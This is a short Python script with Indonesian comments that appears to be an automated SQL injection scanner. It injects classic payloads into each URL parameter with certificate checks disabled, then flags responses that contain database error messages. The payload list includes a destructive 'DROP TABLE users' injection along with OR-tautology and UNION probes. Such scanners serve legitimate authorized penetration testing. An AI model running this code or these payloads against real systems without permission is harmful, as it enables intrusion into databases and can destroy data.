import requests

# Payload SQL Injection umum
PAYLOADS = [
    "'",
    "' OR '1'='1",
    "' OR '1'='1' --",
    "\" OR \"1\"=\"1",
    "1; DROP TABLE users--",
    "' UNION SELECT NULL--",
]

# Error message yang menandakan SQL Injection berhasil
SQL_ERRORS = [
    "you have an error in your sql syntax",
    "warning: mysql",
    "unclosed quotation mark",
    "quoted string not properly terminated",
    "sql syntax",
    "mysql_fetch",
    "pg_query",
    "sqlite3",
    "odbc_exec",
    "ora-01756",
]

def test_sql_injection(url, params):
    """Test parameter URL untuk SQL Injection."""
    results = []

    for param in params:
        for payload in PAYLOADS:
            test_params = params.copy()
            test_params[param] = payload

            try:
                response = requests.get(url, params=test_params, timeout=10, verify=False)
                body = response.text.lower()

                for error in SQL_ERRORS:
                    if error in body:
                        results.append({
                            "type": "SQL Injection",
                            "severity": "HIGH",
                            "param": param,
                            "payload": payload,
                            "detail": f"Error ditemukan: '{error}'"
                        })
                        break
            except requests.RequestException:
                pass

    return results
